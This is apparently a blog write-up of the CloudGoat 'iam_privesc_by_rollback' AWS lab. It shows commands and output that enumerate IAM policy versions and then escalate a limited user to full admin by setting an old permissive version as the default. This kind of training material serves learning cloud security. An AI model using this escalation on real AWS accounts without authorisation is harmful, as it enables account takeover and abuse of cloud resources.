---
layout: post
title: AWS Pentest with CloudGoat (iam_privesc_by_rollback)
categories: Cloud
---

## Setup target enviroment
Using CloudGaot, we can set up the target environment. 
```shell
kali@kali:~/cloudgoat$ ./cloudgoat.py create iam_privesc_by_rollback
Using default profile "default" from config.yml...
Loading whitelist.txt...
A whitelist.txt file was found that contains at least one valid IP address or range.
Initializing the backend...
Initializing provider plugins...
- Finding latest version of hashicorp/local...
- Finding latest version of hashicorp/aws...
- Finding latest version of hashicorp/null...
- Installing hashicorp/local v2.5.2...
- Installed hashicorp/local v2.5.2 (signed by HashiCorp)
- Installing hashicorp/aws v5.72.1...
- Installed hashicorp/aws v5.72.1 (signed by HashiCorp)
- Installing hashicorp/null v3.2.3...
- Installed hashicorp/null v3.2.3 (signed by HashiCorp)
Terraform has created a lock file .terraform.lock.hcl to record the provider
selections it made above. Include this file in your version control repository
so that Terraform can guarantee to make the same selections by default when
you run "terraform init" in the future.

Terraform has been successfully initialized!

---snip---

[cloudgoat] terraform output completed with no error code.
cloudgoat_output_aws_account_id = 096165652555
cloudgoat_output_policy_arn = arn:aws:iam::096165652555:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidi6arp6df8r
cloudgoat_output_raynor_access_key_id = AKI{MASK}
cloudgoat_output_raynor_secret_key = twe{MASK}
cloudgoat_output_username = raynor-iam_privesc_by_rollback_cgidi6arp6df8r

[cloudgoat] Output file written to:

    /home/kali/cloudgoat/iam_privesc_by_rollback_cgidi6arp6df8r/start.txt

                                                                                                                                                                                    
kali@kali:~/cloudgoat$
```

## Setup AWS CLI
```shell
kali@kali:~/cloudgoat$ aws configure --profile raynor                                                                                
AWS Access Key ID [****************NZOB]: AKI{MASK}
AWS Secret Access Key [****************scS6]: twe{MASK}
Default region name [None]: 
Default output format [None]: 

kali@kali:~/cloudgoat$
```

## Listing policies attached with the IAM role
```shell
kali@kali:~/cloudgoat$ aws iam list-attached-user-policies --user-name raynor-iam_privesc_by_rollback_cgidi6arp6df8r --profile raynor
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-raynor-policy-iam_privesc_by_rollback_cgidi6arp6df8r",
            "PolicyArn": "arn:aws:iam::096165652555:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidi6arp6df8r"
        }
    ]
}

kali@kali:~/cloudgoat$
```

## Showing the description of the policy
```shell
kali@kali:~/cloudgoat$ aws iam get-policy --policy-arn arn:aws:iam::096165652555:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidi6arp6df8r
{
    "Policy": {
        "PolicyName": "cg-raynor-policy-iam_privesc_by_rollback_cgidi6arp6df8r",
        "PolicyId": "ANPARMY7LNBF5KTFGEFVW",
        "Arn": "arn:aws:iam::096165652555:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidi6arp6df8r",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "cg-raynor-policy",
        "CreateDate": "2024-10-22T06:19:44+00:00",
        "UpdateDate": "2024-10-22T06:19:47+00:00",
        "Tags": []
    }
}
                                                                                                                                                                                    
kali@kali:~/cloudgoat$
```

## Showing versions of the policy
```shell
kali@kali:~/cloudgoat$ aws iam list-policy-versions --policy-arn arn:aws:iam::096165652555:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidi6arp6df8r
{
    "Versions": [
        {
            "VersionId": "v5",
            "IsDefaultVersion": false,
            "CreateDate": "2024-10-22T06:19:47+00:00"
        },
        {
            "VersionId": "v4",
            "IsDefaultVersion": false,
            "CreateDate": "2024-10-22T06:19:47+00:00"
        },
        {
            "VersionId": "v3",
            "IsDefaultVersion": false,
            "CreateDate": "2024-10-22T06:19:47+00:00"
        },
        {
            "VersionId": "v2",
            "IsDefaultVersion": false,
            "CreateDate": "2024-10-22T06:19:47+00:00"
        },
        {
            "VersionId": "v1",
            "IsDefaultVersion": true,
            "CreateDate": "2024-10-22T06:19:44+00:00"
        }
    ]
}
                                                                                                                                                                                    
kali@kali:~/cloudgoat$
```

## Showing the Default (currently applied) version of the policy "v1"
There is `SetDefaultPolicyVersion` permission attached, this can be used to change the default policy which is currently applied.
```shell
kali@kali:~/cloudgoat$ aws iam get-policy-version --policy-arn arn:aws:iam::096165652555:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidi6arp6df8r --version-id v1 --profile raynor
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:Get*",
                        "iam:List*",
                        "iam:SetDefaultPolicyVersion"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "IAMPrivilegeEscalationByRollback"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2024-10-22T06:19:44+00:00"
    }
}

kali@kali:~/cloudgoat$
```

## Checking the policy "v2" 
```shell
kali@kali:~/cloudgoat$ aws iam get-policy-version --policy-arn arn:aws:iam::096165652555:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidi6arp6df8r --version-id v2 --profile raynor       
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": {
                "Effect": "Deny",
                "Action": "*",
                "Resource": "*",
                "Condition": {
                    "NotIpAddress": {
                        "aws:SourceIp": [
                            "192.0.2.0/24",
                            "203.0.113.0/24"
                        ]
                    }
                }
            }
        },
        "VersionId": "v2",
        "IsDefaultVersion": false,
        "CreateDate": "2024-10-22T06:19:47+00:00"
    }
}
                                                                                                                                          kali@kali:~/cloudgoat$
```

## Checking the policy "v3"
```shell
kali@kali:~/cloudgoat$ aws iam get-policy-version --policy-arn arn:aws:iam::096165652555:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidi6arp6df8r --version-id v3 --profile raynor
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": "*",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v3",
        "IsDefaultVersion": false,
        "CreateDate": "2024-10-22T06:19:47+00:00"
    }
}

kali@kali:~/cloudgoat$
```

## Checking the policy "v4"
```shell
kali@kali:~/cloudgoat$ aws iam get-policy-version --policy-arn arn:aws:iam::096165652555:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidi6arp6df8r --version-id v4 --profile raynor
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": {
                "Effect": "Allow",
                "Action": [
                    "s3:ListBucket",
                    "s3:GetObject",
                    "s3:ListAllMyBuckets"
                ],
                "Resource": "*"
            }
        },
        "VersionId": "v4",
        "IsDefaultVersion": false,
        "CreateDate": "2024-10-22T06:19:47+00:00"
    }
}

kali@kali:~/cloudgoat$ 
```

## Checking the policy "v5"
```shell
kali@kali:~/cloudgoat$ aws iam get-policy-version --policy-arn arn:aws:iam::096165652555:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidi6arp6df8r --version-id v5 --profile raynor
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": {
                "Effect": "Allow",
                "Action": "iam:Get*",
                "Resource": "*",
                "Condition": {
                    "DateGreaterThan": {
                        "aws:CurrentTime": "2017-07-01T00:00:00Z"
                    },
                    "DateLessThan": {
                        "aws:CurrentTime": "2017-12-31T23:59:59Z"
                    }
                }
            }
        },
        "VersionId": "v5",
        "IsDefaultVersion": false,
        "CreateDate": "2024-10-22T06:19:47+00:00"
    }
}
```

According to the information above, we can find out "v3" has strong permission which is equal to admin account.
```shell
 "Statement": [
                {
                    "Action": "*",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ]
```

## Configure default policy to `v3`
```shell
kali@kali:~/cloudgoat$ aws iam set-default-policy-version --policy-arn arn:aws:iam::096165652555:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidi6arp6df8r --version-id v3 --profile raynor

kali@kali:~/cloudgoat$
```

## The default version id has been changed
```shell
kali@kali:~/cloudgoat$ aws iam get-policy --policy-arn arn:aws:iam::096165652555:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidi6arp6df8r --profile raynor
{
    "Policy": {
        "PolicyName": "cg-raynor-policy-iam_privesc_by_rollback_cgidi6arp6df8r",
        "PolicyId": "ANPARMY7LNBF5KTFGEFVW",
        "Arn": "arn:aws:iam::096165652555:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidi6arp6df8r",
        "Path": "/",
        "DefaultVersionId": "v3",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "cg-raynor-policy",
        "CreateDate": "2024-10-22T06:19:44+00:00",
        "UpdateDate": "2024-10-25T04:36:40+00:00",
        "Tags": []
    }
}

kali@kali:~/cloudgoat$
```